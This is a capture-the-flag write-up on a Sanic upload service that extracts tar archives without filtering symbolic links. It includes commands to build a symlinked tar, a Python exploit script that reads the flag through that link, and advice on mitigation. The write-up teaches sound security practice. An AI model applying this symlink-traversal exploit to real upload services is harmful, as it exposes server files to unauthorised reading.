# 🐚 Tarrible_Storage

## 🧠 Description

This challenge revolves around a **Sanic-based file upload web application** that **extracts uploaded tar archives** into user-specific directories. It fails to properly handle **symbolic links**, allowing for a classic **path traversal via symlink injection**. Authentication is enforced via JWT.

---

## 🛠️ Environment Setup

```bash
docker build -t my-sanic-chal .
docker run -d -p 8000:8000 my-sanic-chal
```

---

## 🔍 Vulnerability

- The `/api/upload` endpoint accepts `.tar` files and extracts them directly into the user’s folder.
- It does **not filter or sanitize symbolic links**.
- The `/api/access/<filename>` endpoint **only checks that the final resolved path is inside the user’s directory**, but follows symlinks without restriction.
- This allows a symbolic link such as `get_flag → ../../flag` to be used for reading the challenge flag.

---

## 🔓 Exploitation Steps

### ✅ 1. Register and Login

- Register via `/api/signup`
- Login via `/api/login` and obtain the JWT
- Save the JWT for authenticated requests

### ✅ 2. Create a Symbolic Link & Archive

```bash
ln -s ../../flag get_flag
tar -cvf hack.tar get_flag
```

This creates a tar archive that contains a symlink pointing to the real flag file located outside the user’s directory.

### ✅ 3. Upload the Tar File

Use an authenticated POST request to `/api/upload` with the contents of `hack.tar`. Include your JWT token in the `Authorization` header.

### ✅ 4. Read the Flag via Symlink

Send a GET request to `/api/access/get_flag`. Since the symlink resolves to `../../flag`, the server reads and returns the flag file.

---

## 🧪 Exploit Code (Python)

```python
import requests

HOST = 'http://127.0.0.1:8000/'
session = requests.session()

# Use the JWT you got from /api/login
TOKEN = "Bearer <YOUR_JWT_HERE>"

headers_upload = {
    'Authorization': TOKEN,
    'Content-Type': 'application/octet-stream',
}

# Step 1: Upload malicious tar
with open('hack.tar', 'rb') as f:
    data = f.read()

res = session.post(
    url=HOST + "api/upload",
    headers=headers_upload,
    data=data,
    verify=False
)
print("Upload response:", res.text)

# Step 2: Access symlinked file
headers_access = {
    'Authorization': TOKEN,
}

res = session.get(
    url=HOST + "api/access/get_flag",
    headers=headers_access,
    verify=False
)
print("Flag:", res.text)
```

---

## ⚠️ Why This Works

- **tarfile.extractall()** does not block symlinks by default.
- **os.path.abspath + .startswith()** path validation is bypassed via symbolic links.
- Symlinks are preserved and followed by the server, allowing the attacker to escape the intended user directory.
- **This is not a directory traversal via filename, but a traversal via archived symlink!**

---

## 🧷 Mitigation Tips

- Never use `extractall()` on untrusted tar files without filtering members.
- Consider filtering or rejecting symlinks:
    ```python
    for member in tar.getmembers():
        if member.issym() or member.islnk():
            continue  # or raise error
        tar.extract(member, path)
    ```
- Always validate resolved file paths using `realpath()` to detect symlink abuse.

---

## ✅ Key Takeaways

- **Vulnerability**: Tar archive symlink bypass
- **Root Cause**: Lack of symlink validation during tar extraction
- **Exploit**:
    1. Create `ln -s ../../flag get_flag`
    2. `tar -cvf hack.tar get_flag`
    3. Upload via `/api/upload`
    4. Read via `/api/access/get_flag`
- **Auth Bypass?** ❌ No — you need valid JWT (auth is enforced properly)
- **Impact**: Disclosure of arbitrary server-side files (e.g., flag)
